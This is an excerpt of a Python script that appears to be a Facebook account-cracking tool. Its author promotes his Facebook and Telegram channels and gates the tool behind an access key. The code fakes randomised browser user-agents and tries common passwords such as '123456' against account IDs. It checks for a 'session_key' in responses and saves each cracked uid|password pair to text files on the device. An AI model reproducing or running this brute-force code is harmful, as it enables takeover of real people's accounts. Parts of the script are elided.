...
channel_link = "https://www.facebook.com/AKASH.MAHMUD.102114"

# Valid keys (channel par available hogi)
approved_keys = ["MR-AKASH-xdhhsjbudfauvz123@@##$$$dyvyhv-2026"]
...
def first_step():
    ...
    print("\033[1;32m KEY AMR FACEBOOK AND TELEGRAM AY PABEN✅ \033[0m\n")
    print("[!] FIRST FOLLOW MY FACEBOOK")
...
os.system('clear')
print(' \x1b[38;5;46mAKASH SERVER LOADING....')
...
os.system('clear')
os.system('xdg-open https://t.me/AKASH_MAHMUD_143')
os.system('xdg-open https://www.facebook.com/AKASH.MAHMUD.102114')
...
def window1():
    ...
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}); Win64; x64) AppleWebKit/{bz} (KHTML, like Gecko) Firefox/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 10.{random.choice(['0', '1', '2'])}; Win32; x86) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])


# Set window title
sys.stdout.write('\x1b]2;𓆩【A K A S H 】𓆪 \x07')
    ...
    try:
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                ...
                open('/sdcard/MR-AKASH-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        ...
        try:
            with requests.Session() as session:
                ...
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/MR-AKASH-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
